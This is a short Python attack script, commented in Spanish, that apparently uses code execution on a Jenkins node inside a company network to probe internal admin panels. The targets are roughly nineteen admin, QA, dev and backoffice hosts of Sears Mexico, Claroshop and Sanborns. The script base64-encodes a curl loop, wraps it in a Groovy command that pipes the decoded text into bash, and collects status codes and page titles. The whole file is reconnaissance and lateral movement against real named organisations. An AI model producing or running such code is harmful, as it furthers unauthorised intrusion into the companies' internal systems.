#!/usr/bin/env python3
# Probe de URLs candidatas del panel admin desde el nodo Jenkins (red interna)
import base64, sys
from admonplaza_query import jenkins_exec

sys.stdout.reconfigure(errors='replace')

URLS = [
    "https://axii.admin.sears.com.mx",
    "https://axii.qa.sears.com.mx",
    "https://axii.dev.sears.com.mx",
    "https://axii.release.admin.sears.com.mx",
    "https://axii.admin.claroshop.com",
    "https://axii.qa.claroshop.com",
    "https://axii.dev.claroshop.com",
    "https://axii.release.admin.claroshop.com",
    "https://axii.admin.sanborns.com.mx",
    "https://admin.sears.com.mx",
    "https://panel.sears.com.mx",
    "https://backoffice.sears.com.mx",
    "https://admonplaza.sears.com.mx",
    "https://admin.claroshop.com",
    "https://pot.admin.claroshop.com",
    "https://axii.sears.com.mx",
    "https://ats.admin.sears.com.mx",
    "https://reps.admin.sears.com.mx",
    "http://admin.sears.com.mx/WcfT1Comercio/Servicios.svc/WcfT1Comercio.Servicios",
]

bash = "for U in %s; do\n" % " ".join(URLS)
bash += """  CODE=$(curl -sk -o /tmp/resp_probe.txt -w "%{http_code}|%{size_download}|%{redirect_url}" --connect-timeout 6 --max-time 12 -A "Mozilla/5.0" "$U")
  TITLE=$(grep -oiP '(?<=<title>)[^<]+' /tmp/resp_probe.txt 2>/dev/null | head -1)
  echo "PROBE|$U|$CODE|$TITLE"
done
echo PROBE_DONE
"""

bash_b64 = base64.b64encode(bash.encode()).decode()
groovy = 'def r = ["bash","-c","echo %s | base64 -d | bash"].execute().text\nprintln r\n' % bash_b64
out = jenkins_exec(groovy, timeout=300)
print(out)
